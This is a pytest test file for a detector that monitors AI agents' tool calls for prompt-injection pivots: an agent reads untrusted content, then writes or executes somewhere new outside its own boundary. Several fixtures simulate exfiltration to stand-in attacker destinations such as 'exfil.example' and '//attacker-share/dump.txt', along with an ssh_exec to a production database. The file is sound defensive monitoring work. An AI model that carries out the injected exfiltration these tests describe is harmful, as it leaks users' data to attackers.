"""
test_agent_detector.py — real tests for Layer 9, Agent Behavior
Detection, including the prompt-injection pivot signature that is the
reason this layer exists.
"""

import pytest

from agent_baseline import parse_agent_event, build_agent_baseline
from agent_detector import AgentBehaviorDetector


def ev(t, tool, target, action="read", provenance="trusted", size=100,
       agent="svc/report-bot", session="pod-1", success=True):
    return {
        "time": t, "agent_id": agent, "session_id": session, "tool": tool,
        "target": target, "action": action, "input_provenance": provenance,
        "result_size": size, "success": success,
    }


def clean_window():
    """A plausible normal day for a reporting agent."""
    events = []
    t = 1000.0
    for i in range(12):
        events.append(ev(t + i * 30, "db_query", "reports.sales", size=100 + i))
        events.append(ev(t + i * 30 + 10, "read_file", "/data/daily.csv", size=90 + i))
    return events


# ---------------------------------------------------------------- parsing

def test_parse_accepts_dict_and_json_string():
    d = parse_agent_event(ev(1.0, "db_query", "reports.sales"))
    s = parse_agent_event('{"time":1.0,"agent_id":"a","tool":"t","action":"read"}')
    assert d["tool"] == "db_query"
    assert s["agent_id"] == "a"


def test_parse_rejects_missing_required_fields():
    assert parse_agent_event({"time": 1.0, "agent_id": "a"}) is None
    assert parse_agent_event("not json at all") is None
    assert parse_agent_event("") is None


def test_parse_normalizes_unknown_provenance():
    e = parse_agent_event({"time": 1, "agent_id": "a", "tool": "t",
                           "action": "read", "input_provenance": "weird"})
    assert e["input_provenance"] == "unknown"


# --------------------------------------------------------------- baseline

def test_baseline_keys_on_durable_identity_not_session():
    """The documented failure mode: ephemeral instances resetting
    security state. Same agent across three pods must be one profile."""
    events = [
        ev(1000, "db_query", "reports.sales", session="pod-1"),
        ev(1030, "db_query", "reports.sales", session="pod-2"),
        ev(1060, "read_file", "/data/daily.csv", session="pod-3"),
    ]
    baseline = build_agent_baseline(events)
    assert list(baseline.keys()) == ["svc/report-bot"]
    assert baseline["svc/report-bot"]["observed_calls"] == 3


def test_baseline_excludes_failed_calls_from_normal():
    events = clean_window()
    events.append(ev(2000, "ssh_exec", "prod-db-01", action="execute", success=False))
    baseline = build_agent_baseline(events)
    assert "ssh_exec" not in baseline["svc/report-bot"]["known_tools"]


def test_baseline_tracks_write_targets_separately():
    events = clean_window()
    events.append(ev(1500, "write_file", "/out/report.pdf", action="write"))
    profile = build_agent_baseline(events)["svc/report-bot"]
    assert "/out/report.pdf" in profile["write_targets"]
    assert "reports.sales" not in profile["write_targets"]


# ---------------------------------------------------------------- signals

def test_normal_activity_emits_nothing():
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    assert d.process_event(ev(5000, "db_query", "reports.sales", size=105)) == []


def test_new_tool_and_new_target_fire_independently():
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    s = d.process_event(ev(5000, "http_request", "internal-wiki", size=100))
    assert "NEW_TOOL" in s and "NEW_TARGET" in s


def test_unknown_agent_emits_nothing_conservatively():
    d = AgentBehaviorDetector(build_agent_baseline(clean_window()))
    assert d.process_event(ev(5000, "anything", "anywhere", agent="svc/never-seen")) == []


def test_privilege_escalation_on_first_write_to_read_only_target():
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    s = d.process_event(ev(5000, "db_query", "reports.sales", action="write", size=100))
    assert "PRIVILEGE_ESCALATION" in s
    assert "NEW_TARGET" not in s  # target itself is known; only the write is new


def test_result_size_outlier_uses_agent_own_baseline():
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    s = d.process_event(ev(5000, "db_query", "reports.sales", size=500000))
    assert "RESULT_SIZE_OUTLIER" in s


# ------------------------------------------- the signature this layer exists for

def test_tainted_scope_expansion_requires_acting_outward():
    """REFINED after the original rule failed on real traces (it fired
    on 5 of 6 false positives). Read untrusted content, then take a
    novel WRITE or EXECUTE action outside the agent's own boundary."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event(ev(5000, "read_file", "/data/daily.csv",
                       provenance="untrusted", size=100))
    s = d.process_event({**ev(5010, "http_post", "https://exfil.example",
                              action="write", size=100), "external": True})

    assert "TAINTED_SCOPE_EXPANSION" in s
    assert "NEW_TARGET" in s


def test_novel_outward_read_after_taint_does_not_fire():
    """The finding that forced the refinement: consuming external
    content is what research agents do. A novel outward READ is not a
    pivot, however new the target."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event(ev(5000, "read_file", "/data/daily.csv",
                       provenance="untrusted", size=100))
    s = d.process_event({**ev(5010, "read_file", "/etc/other.conf", size=100),
                         "external": True})

    assert "NEW_TARGET" in s
    assert "TAINTED_SCOPE_EXPANSION" not in s


def test_novel_inward_write_after_taint_does_not_fire():
    """Benign agents read outward and write inward - the exact shape of
    the real false positives (read a doc, write a summary locally)."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event(ev(5000, "read_file", "/data/daily.csv",
                       provenance="untrusted", size=100))
    s = d.process_event({**ev(5010, "write_file", "/work/summary.md",
                              action="write", size=100), "external": False})

    assert "NEW_TARGET" in s
    assert "TAINTED_SCOPE_EXPANSION" not in s


def test_new_target_without_taint_does_not_fire_pivot_signal():
    """Agents legitimately reach new targets. Novelty alone is not the
    signal - only novelty in the shadow of untrusted input is."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    s = d.process_event(ev(5000, "db_query", "hr.salaries", size=100))
    assert "NEW_TARGET" in s
    assert "TAINTED_SCOPE_EXPANSION" not in s


def test_taint_without_scope_expansion_does_not_fire_pivot_signal():
    """Agents read untrusted content constantly. Taint alone is not the
    signal either."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    d.process_event(ev(5000, "read_file", "/data/daily.csv", provenance="untrusted"))
    s = d.process_event(ev(5010, "db_query", "reports.sales", size=100))
    assert "TAINTED_SCOPE_EXPANSION" not in s


def test_reading_untrusted_content_never_implicates_itself():
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    s = d.process_event(ev(5000, "http_request", "https://evil.example",
                           provenance="untrusted", size=100))
    assert "NEW_TOOL" in s
    assert "TAINTED_SCOPE_EXPANSION" not in s


def test_taint_expires_by_time():
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    d.process_event(ev(5000, "read_file", "/data/daily.csv", provenance="untrusted"))
    s = d.process_event({**ev(5000 + 600, "http_post", "https://late.example",
                              action="write", size=100), "external": True})
    assert "TAINTED_SCOPE_EXPANSION" not in s
    assert "NEW_TARGET" in s


def test_taint_expires_by_call_count_even_within_time_window():
    """A burst of rapid calls must not outrun the window on time alone."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    d.process_event(ev(5000, "read_file", "/data/daily.csv", provenance="untrusted"))
    for i in range(12):
        d.process_event(ev(5001 + i, "db_query", "reports.sales", size=100))
    s = d.process_event({**ev(5020, "http_post", "https://late.example",
                              action="write", size=100), "external": True})
    assert "TAINTED_SCOPE_EXPANSION" not in s


def test_call_rate_spike_catches_machine_speed_movement():
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    signals = []
    for i in range(40):
        signals = d.process_event(ev(6000 + i * 0.2, "db_query", "reports.sales", size=100))
    assert "CALL_RATE_SPIKE" in signals


def test_full_pivot_chain_produces_multiple_distinct_signal_types():
    """End to end: the chain a real injected pivot produces should be
    corroborated by type diversity, not rest on one signal."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event(ev(7000, "read_file", "/data/daily.csv", provenance="untrusted"))
    s = d.process_event({**ev(7005, "ssh_exec", "/remote/prod-db-01",
                              action="execute", size=900000), "external": True})

    # PRIVILEGE_ESCALATION is deliberately absent: the target is
    # brand-new, which is NEW_TARGET, not escalation.
    assert {"NEW_TOOL", "NEW_TARGET", "TAINTED_SCOPE_EXPANSION",
            "RESULT_SIZE_OUTLIER"} <= set(s)


def test_privilege_escalation_requires_a_previously_read_target():
    """Narrowed after a real evaluation: creating a new file is not
    escalation. Acting on something previously only observed is."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    # reports.sales is a known target the agent has only ever read
    s = d.process_event(ev(8000, "db_query", "reports.sales",
                           action="write", size=100))
    assert "PRIVILEGE_ESCALATION" in s


def test_writing_a_brand_new_file_is_not_privilege_escalation():
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)
    s = d.process_event(ev(8000, "write_file", "/out/brand_new.txt",
                           action="write", size=100))
    assert "NEW_TARGET" in s
    assert "PRIVILEGE_ESCALATION" not in s


if __name__ == "__main__":
    import sys
    sys.exit(pytest.main([__file__, "-v"]))


# ---------------------------------------------------------------------------
# Regression: busy-minute rate, not wall-clock average.
# Found by a real end-to-end run, not by a unit test - the same class of
# bug this project already fixed once on the flow side (APIS Part 3.4).
# ---------------------------------------------------------------------------

def sparse_window():
    """An agent that works in short bursts with long idle gaps - the
    shape that broke the original rate calculation."""
    events = []
    t = 1_770_000_000.0
    for day in range(3):
        for i in range(40):
            base = t + day * 86400 + i * 60
            events.append(ev(base, "db_query", "reports.sales"))
            events.append(ev(base + 20, "read_file", "/data/daily.csv"))
            events.append(ev(base + 40, "write_file", "/out/report.pdf", action="write"))
    return events


def test_baseline_rate_reflects_busy_minutes_not_idle_time():
    profile = build_agent_baseline(sparse_window())["svc/report-bot"]
    # 3 calls per working minute. A wall-clock average over 3 days of
    # mostly-idle time would give ~0.12 and cause constant false alarms.
    assert profile["avg_calls_per_minute"] >= 3.0


def test_normal_burst_activity_does_not_trigger_rate_spike():
    baseline = build_agent_baseline(sparse_window())
    d = AgentBehaviorDetector(baseline)
    t = 1_770_400_000.0
    fired = []
    for dt, tool, tgt, act in [(0, "db_query", "reports.sales", "read"),
                               (20, "read_file", "/data/daily.csv", "read"),
                               (40, "write_file", "/out/report.pdf", "write")]:
        # size matches the baseline window's own sizes, so this exercises
        # the rate logic specifically rather than tripping the size signal
        fired += d.process_event(ev(t + dt, tool, tgt, action=act, size=100))
    assert fired == []


def test_rate_spike_still_fires_on_genuine_machine_speed_burst():
    baseline = build_agent_baseline(sparse_window())
    d = AgentBehaviorDetector(baseline)
    t = 1_770_500_000.0
    signals = []
    for i in range(30):
        signals = d.process_event(ev(t + i * 0.5, "db_query", "reports.sales", size=100))
    assert "CALL_RATE_SPIKE" in signals


# ---------------------------------------------------------------------------
# Third refinement: write-adjacency. Driven by 4 real false positives that
# appeared once research-agent sessions were added to the corpus (22
# untrusted reads instead of 5).
# ---------------------------------------------------------------------------

def test_summarizing_next_to_the_source_does_not_fire():
    """The exact benign shape that broke the previous rule: read a file
    from outside the workspace, write a summary beside it."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event({**ev(5000, "Read", "/proj/quorum.py", provenance="untrusted"),
                     "external": True})
    s = d.process_event({**ev(5010, "Write", "/proj/quorum_note.md",
                              action="write", size=100), "external": True})

    assert "NEW_TARGET" in s
    assert "TAINTED_SCOPE_EXPANSION" not in s


def test_writing_somewhere_unrelated_still_fires():
    """Exfiltration: the write lands nowhere near what was read."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event({**ev(5000, "Read", "/proj/quorum.py", provenance="untrusted"),
                     "external": True})
    s = d.process_event({**ev(5010, "Write", "//attacker-share/dump.txt",
                              action="write", size=100), "external": True})

    assert "TAINTED_SCOPE_EXPANSION" in s


def test_url_host_is_the_unit_of_place_for_web_targets():
    """Fetching from one host and posting to another is not adjacency."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event({**ev(5000, "WebFetch", "https://docs.python.org/3/library/csv.html",
                          provenance="untrusted"), "external": True})
    s = d.process_event({**ev(5010, "WebFetch", "https://exfil.example/collect",
                              action="write", size=100), "external": True})

    assert "TAINTED_SCOPE_EXPANSION" in s


def test_unknown_location_never_suppresses_the_signal():
    """A bare executable name has no location. Missing information must
    not be read as a match."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event({**ev(5000, "Bash", "curl", provenance="untrusted"),
                     "external": True})
    s = d.process_event({**ev(5010, "Write", "//attacker-share/dump.txt",
                              action="write", size=100), "external": True})

    assert "TAINTED_SCOPE_EXPANSION" in s


def test_adjacency_is_directory_level_not_prefix_level():
    """A sibling directory is a different place, even though the paths
    share a long prefix."""
    baseline = build_agent_baseline(clean_window())
    d = AgentBehaviorDetector(baseline)

    d.process_event({**ev(5000, "Read", "/proj/src/quorum.py", provenance="untrusted"),
                     "external": True})
    s = d.process_event({**ev(5010, "Write", "/proj/secrets/dump.txt",
                              action="write", size=100), "external": True})

    assert "TAINTED_SCOPE_EXPANSION" in s
